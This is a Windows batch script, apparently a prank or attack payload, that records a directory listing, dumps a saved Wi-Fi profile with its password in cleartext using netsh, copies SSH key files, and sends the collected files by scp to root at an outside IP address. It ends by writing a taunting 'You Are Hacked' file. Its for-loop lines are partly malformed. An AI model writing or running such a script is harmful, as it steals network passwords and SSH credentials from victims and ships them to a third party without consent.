@echo off

set ssid=Samrat_5G
set usrname=Musafir

@REM <(o)> DATE TIME <(o)>
set CUR_YYYY=%date:~6,4%
set CUR_Mt=%date:~3,2%
set CUR_DD=%date:~0,2%

set CUR_HH=%time:~0,2%
set CUR_Mn=%time:~3,2%
set CUR_SS=%time:~6,2%
if %CUR_HH% lss 10 (set CUR_HH=0%time:~1,1%) 

set dateTime=%CUR_DD%%CUR_Mt%%CUR_YYYY%-%CUR_HH%%CUR_Mn%%CUR_SS%
@REM timeout /T 5 /nobreak > NUL 


@REM <(o)> PAYLOAD STARTED <(o)>

dir > %ssid%-dirinfo-%dateTime%
netsh wlan show profile %ssid% key=clear > %ssid%-wifiinfo-%dateTime%

for %I in (id_rsa known_hosts) do copy %I c:\Users\%usrname%\.ssh
for %I in (id_rsa known_hosts) do scp -rp (%ssid%-dirinfo-%dateTime% %ssid%-wifiinfo-%dateTime%) root@198.58.98.140:/root/received-data/wifi-info
timeout /t 1 /nobreak > NUL
cd ..
echo You Are Hacked > SuRpRiZe-MaDaFaKa
